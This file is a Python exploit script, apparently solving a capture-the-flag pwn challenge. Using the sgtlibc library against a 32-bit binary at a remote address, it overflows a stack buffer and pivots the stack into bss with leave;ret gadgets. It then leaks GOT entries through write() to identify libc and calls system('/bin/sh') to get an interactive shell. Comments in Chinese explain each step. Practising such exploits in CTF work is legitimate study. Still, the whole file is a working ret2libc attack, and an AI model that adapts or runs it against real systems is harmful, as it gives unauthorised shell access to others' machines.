import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=False,
    file='./spwn',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

plt_write = elf.plt['write']  # write()
main_addr = 0x08048513  # elf.symbols['main']
bss_addr = 0x0804A300
leave_ret = elf.rop['leave']



canary = b''


def exp():
    # overflow position
    data = [b'a' * (136),fakeebp()]
    return data


def leak(func: str):
    log.info(f'start leak {func}')
    payload = exp()
    payload += [plt_write, main_addr]
    # write(1,buffer,4) # 32位地址长度为4
    payload += [1, elf.got[func], 4]
    # 如果是read的话则sa，如果是gets scanf的话则sl
    sa(b'What is your name?', payload)
    payload = [b'a'*24, bss_addr, leave_ret]
    sa(b'to say?', payload)
    data = rc(4)  # 32位接收4个
    data = u00(data)
    s.add_condition(func, data)
    log.info(f'leak {func} : {hex(data)}')
    return data


pause()
# 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确
leak('__libc_start_main')
leak('read')
leak('write')
data = s.dump(db_index=0)

# 如果给了libc则可以直接使用
# libc = ELF('libc_buu-2.23_x86.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset

# 再次利用payload，溢出执行system
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
pause()

payload = [exp()]
payload += [system_addr, fakeebp(), binsh_addr]
sa(b'What is your name?', payload)
ret_addr = elf.rop['ret']  # 栈平衡
payload = [b'a'*24, ret_addr, ]
payload += [bss_addr, leave_ret]
sa(b'to say?', payload)
interactive()
